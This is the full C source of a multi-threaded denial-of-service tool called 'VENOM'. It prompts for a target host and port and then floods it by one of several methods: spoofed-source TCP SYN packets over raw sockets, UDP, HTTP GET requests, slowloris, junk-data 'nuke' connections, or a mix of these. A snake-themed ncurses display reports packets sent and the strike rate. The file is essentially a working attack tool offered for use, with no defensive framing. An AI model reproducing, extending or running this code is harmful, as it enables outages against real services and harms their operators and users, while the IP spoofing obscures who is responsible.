#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <ncurses.h>

volatile int running = 1;
volatile unsigned long long sent = 0;
volatile unsigned long long total_bytes = 0;
volatile double rate = 0.0;

char host[256];
int port;
int method;
int threads = 120;
int spoof = 1;
int rawfd = -1;
struct in_addr dest_ip;

pthread_t workers[400];
int active = 0;
struct timespec last_t;
unsigned long long last_sent = 0;

char *agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
    "curl/7.68.0",
    "Go-http-client/1.1"
};

char *paths[] = {"/", "/wp-admin", "/api", "/login", "/index.php", "/admin", "/.env"};

unsigned short csum(unsigned short *p, int n) {
    unsigned long sum = 0;
    while(n > 1) { sum += *p++; n -= 2; }
    if(n == 1) sum += *(unsigned char*)p;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

void tcp_flood() {
    char pkt[4096];
    struct in_addr src;
    struct sockaddr_in out;
    out.sin_family = AF_INET;
    out.sin_port = htons(port);
    out.sin_addr = dest_ip;
    
    while(running) {
        if(spoof) src.s_addr = htonl((rand() << 16) | rand());
        else src.s_addr = inet_addr("10.0.0.1");
        
        struct iphdr *ip = (struct iphdr*)pkt;
        struct tcphdr *tcp = (struct tcphdr*)(pkt + sizeof(struct iphdr));
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = src.s_addr;
        ip->daddr = dest_ip.s_addr;
        ip->check = csum((unsigned short*)pkt, 20);
        
        tcp->source = htons(1024 + (rand() % 64511));
        tcp->dest = htons(port);
        tcp->seq = htonl(rand());
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        struct pseudo {
            uint32_t saddr;
            uint32_t daddr;
            uint8_t zero;
            uint8_t proto;
            uint16_t len;
        } ph;
        ph.saddr = src.s_addr;
        ph.daddr = dest_ip.s_addr;
        ph.zero = 0;
        ph.proto = IPPROTO_TCP;
        ph.len = htons(sizeof(struct tcphdr));
        
        char ps[sizeof(ph) + sizeof(struct tcphdr)];
        memcpy(ps, &ph, sizeof(ph));
        memcpy(ps + sizeof(ph), tcp, sizeof(struct tcphdr));
        tcp->check = csum((unsigned short*)ps, sizeof(ph) + sizeof(struct tcphdr));
        
        sendto(rawfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr*)&out, sizeof(out));
        __sync_fetch_and_add(&sent, 1);
        __sync_fetch_and_add(&total_bytes, 40);
    }
}

void udp_flood() {
    char buf[1472];
    memset(buf, 'X', sizeof(buf));
    struct sockaddr_in out;
    out.sin_family = AF_INET;
    out.sin_port = htons(port);
    out.sin_addr = dest_ip;
    
    while(running) {
        sendto(rawfd, buf, sizeof(buf), 0, (struct sockaddr*)&out, sizeof(out));
        __sync_fetch_and_add(&sent, 1);
        __sync_fetch_and_add(&total_bytes, sizeof(buf));
    }
}

void http_flood() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return;
    
    struct sockaddr_in out;
    out.sin_family = AF_INET;
    out.sin_port = htons(port);
    out.sin_addr = dest_ip;
    
    if(connect(sock, (struct sockaddr*)&out, sizeof(out)) < 0) {
        close(sock);
        return;
    }
    
    char req[1024];
    snprintf(req, sizeof(req),
        "GET %s?r=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n",
        paths[rand() % 7], rand(), host, agents[rand() % 5]);
    
    send(sock, req, strlen(req), 0);
    close(sock);
    __sync_fetch_and_add(&sent, 1);
    __sync_fetch_and_add(&total_bytes, strlen(req));
}

int socks[2000];
int sock_count = 0;

void slowloris() {
    if(sock_count < 1500) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if(s >= 0) {
            struct sockaddr_in out;
            out.sin_family = AF_INET;
            out.sin_port = htons(port);
            out.sin_addr = dest_ip;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr*)&out, sizeof(out));
            char buf[256];
            snprintf(buf, sizeof(buf), "GET /?%d HTTP/1.1\r\nHost: %s\r\n", rand(), host);
            send(s, buf, strlen(buf), 0);
            socks[sock_count++] = s;
        }
    }
    
    for(int i = 0; i < sock_count; i++) {
        char buf[32];
        snprintf(buf, sizeof(buf), "X-Header: %d\r\n", rand());
        send(socks[i], buf, strlen(buf), 0);
    }
    __sync_fetch_and_add(&sent, sock_count);
}

void nuke() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return;
    
    struct sockaddr_in out;
    out.sin_family = AF_INET;
    out.sin_port = htons(port);
    out.sin_addr = dest_ip;
    
    if(connect(sock, (struct sockaddr*)&out, sizeof(out)) == 0) {
        char junk[4096];
        memset(junk, 'A', 4096);
        for(int i = 0; i < 100; i++) send(sock, junk, 4096, 0);
    }
    close(sock);
    __sync_fetch_and_add(&sent, 100);
    __sync_fetch_and_add(&total_bytes, 409600);
}

void mixed() {
    int r = rand() % 100;
    if(r < 35) http_flood();
    else if(r < 60 && rawfd >= 0) udp_flood();
    else if(r < 80 && rawfd >= 0) tcp_flood();
    else slowloris();
}

void *attack(void *arg) {
    while(running) {
        switch(method) {
            case 1: tcp_flood(); break;
            case 2: udp_flood(); break;
            case 3: http_flood(); break;
            case 4: slowloris(); break;
            case 5: nuke(); break;
            default: mixed();
        }
        if(method != 4) usleep(50);
    }
    return NULL;
}

void *stats_thread(void *arg) {
    clock_gettime(CLOCK_MONOTONIC, &last_t);
    while(running) {
        usleep(200000);
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - last_t.tv_sec) + (now.tv_nsec - last_t.tv_nsec) / 1e9;
        unsigned long long cur = sent;
        rate = (cur - last_sent) / elapsed;
        last_sent = cur;
        last_t = now;
    }
    return NULL;
}

void draw_cobra(int f) {
    char *frames[4][8] = {
        {"    .---.    ", "   /     \\   ", "   | () ()|   ", "    \\  ^  /    ", "     |||||     ", "     |||||     ", "   <______>   ", "   VENOM    "},
        {"    .---.    ", "   /     \\   ", "   | o  o|   ", "    \\  W  /    ", "     |||||     ", "     |||||     ", "   <______>   ", "   STRIKE   "},
        {"    .---.    ", "   /     \\   ", "   | x  x|   ", "    \\  S  /    ", "     /////     ", "     |||||     ", "   <______>   ", "   DEATH    "},
        {"    .---.    ", "   /     \\   ", "   | >  <|   ", "    \\  V  /    ", "     \\\\\\/     ", "      VV      ", "   <______>   ", "   BITE     "}
    };
    int idx = (f / 6) % 4;
    for(int i = 0; i < 8; i++) mvprintw(3 + i, 55, "%s", frames[idx][i]);
}

void draw_ui(int f) {
    clear();
    attron(A_BOLD);
    mvprintw(0, 2, "██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗");
    mvprintw(1, 2, "██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║");
    mvprintw(2, 2, "██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║");
    mvprintw(3, 2, "╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║");
    mvprintw(4, 2, " ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║");
    mvprintw(5, 2, "  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝");
    attroff(A_BOLD);
    draw_cobra(f);
    
    char *mnames[] = {"", "TCP SYN", "UDP", "HTTP", "SLOWLORIS", "NUKE", "MIXED"};
    mvprintw(14, 2, "TARGET: %s:%d", host, port);
    mvprintw(15, 2, "MODE:   %s", mnames[method]);
    mvprintw(16, 2, "FANGS:  %d threads", active);
    mvprintw(17, 2, "SPOOF:  %s", spoof ? "ON" : "OFF");
    
    attron(COLOR_PAIR(1));
    mvprintw(19, 2, "═══════════ VIPER STATS ═══════════");
    attroff(COLOR_PAIR(1));
    mvprintw(21, 4, "VENOM SHOT:   %llu", sent);
    mvprintw(22, 4, "NEUROTOXIN:   %.2f MB", total_bytes / (1024.0 * 1024.0));
    mvprintw(23, 4, "STRIKE RATE:  %.0f p/s", rate);
    
    attron(COLOR_PAIR(2) | A_BOLD);
    mvprintw(25, 2, " >>> [ Q ] to retract fangs <<<");
    attroff(COLOR_PAIR(2) | A_BOLD);
    refresh();
}

int resolve() {
    struct hostent *he = gethostbyname(host);
    if(!he) return 0;
    memcpy(&dest_ip, he->h_addr, sizeof(struct in_addr));
    return 1;
}

int main() {
    char buf[32];
    srand(time(NULL));
    
    printf("\n  ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗\n");
    printf("  ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║\n");
    printf("  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║\n");
    printf("  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║\n");
    printf("   ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║\n");
    printf("    ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝\n\n");
    printf("  target: ");
    fgets(host, sizeof(host), stdin);
    host[strcspn(host, "\n")] = 0;
    if(!resolve()) { printf("  can't resolve\n"); return 1; }
    printf("  port: ");
    fgets(buf, sizeof(buf), stdin);
    port = atoi(buf);
    if(!port) port = 80;
    printf("\n  1.TCP  2.UDP  3.HTTP  4.SLOW  5.NUKE  6.MIX\n> ");
    fgets(buf, sizeof(buf), stdin);
    method = atoi(buf);
    if(method < 1 || method > 6) method = 6;
    printf("  threads (max 350): ");
    fgets(buf, sizeof(buf), stdin);
    int t = atoi(buf);
    if(t > 0 && t < 400) threads = t;
    printf("  spoof ip? (1/0): ");
    fgets(buf, sizeof(buf), stdin);
    spoof = (atoi(buf) == 1);
    
    if((method == 1 || method == 2) && geteuid() != 0) {
        printf("  need root, switching to mixed\n");
        method = 6;
        sleep(1);
    }
    if((method == 1 || method == 2) && geteuid() == 0) {
        rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if(rawfd < 0) method = 6;
    }
    
    printf("\n  firing %d threads...\n", threads);
    sleep(1);
    
    initscr();
    start_color();
    init_pair(1, COLOR_RED, COLOR_BLACK);
    init_pair(2, COLOR_GREEN, COLOR_BLACK);
    cbreak();
    noecho();
    curs_set(0);
    nodelay(stdscr, TRUE);
    
    pthread_t st;
    pthread_create(&st, NULL, stats_thread, NULL);
    
    active = threads;
    for(int i = 0; i < threads; i++)
        pthread_create(&workers[i], NULL, attack, NULL);
    
    int frame = 0, ch;
    while(running) {
        draw_ui(frame++);
        ch = getch();
        if(ch == 'q' || ch == 'Q') running = 0;
        napms(50);
    }
    
    endwin();
    printf("\n  done. %llu packets sent.\n\n", sent);
    return 0;
}
